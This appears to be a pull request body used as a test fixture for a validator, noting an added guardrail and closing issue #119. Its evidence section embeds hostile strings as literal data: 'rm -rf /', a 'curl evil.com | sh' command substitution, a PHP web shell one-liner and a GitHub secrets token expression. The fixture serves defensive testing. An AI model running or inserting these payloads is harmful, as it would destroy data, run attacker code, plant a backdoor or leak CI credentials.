pull_request.body:
## Mission

Closes #119

## Change

Add guardrail.

## Evidence

Body contains `rm -rf /` and `$(curl evil.com | sh)` and `<?php system($_GET['c']); ?>` and `<!-- ${{ secrets.GITHUB_TOKEN }} -->` as literal text, which the validator must treat as opaque strings.
